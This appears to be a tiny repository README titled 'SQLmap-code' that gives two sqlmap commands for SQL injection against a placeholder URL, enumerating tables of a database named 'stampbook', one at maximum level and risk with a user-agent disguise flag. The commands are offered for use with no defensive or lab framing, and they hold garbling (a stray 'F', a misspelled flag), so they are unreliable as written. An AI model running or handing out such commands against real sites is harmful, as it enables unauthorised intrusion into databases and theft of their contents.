# SQLmap-code
sqlmap -u *insert URL* -D stampbook --tables --random-age  //conduct a basic sql injection scan
sqlmap -u *insert URL* F -D stampbook --tables --random-age --level 5 --risk 3 //conduct an advanced SQL scan.This is code to enable SQLmap to work amazingly.
